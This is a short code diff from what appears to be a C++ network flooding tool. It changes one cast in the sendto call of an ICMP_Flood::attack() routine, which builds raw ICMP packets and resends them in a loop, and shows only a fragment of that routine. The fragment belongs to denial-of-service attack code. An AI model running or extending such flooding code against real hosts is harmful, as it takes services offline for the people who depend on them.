@@ -53,7 +53,7 @@ void ICMP_Flood::attack() {
 
             icmp->checksum = htons(csum((unsigned short *) buf, (sizeof(struct ip) + sizeof(struct icmphdr))));
 
-            if((static_cast<int>(sendto(sockets[x], buf, sizeof(buf), 0, (struct sockaddr *)&dst, sizeof(dst)))) == -1){
+            if((static_cast<int>(sendto(sockets[x], buf, sizeof(buf), 0, reinterpret_cast<sockaddr *>(&dst), sizeof(dst)))) == -1){
                 close(sockets[x]);
                 sockets[x] = make_socket(IPPROTO_ICMP);
             }else{
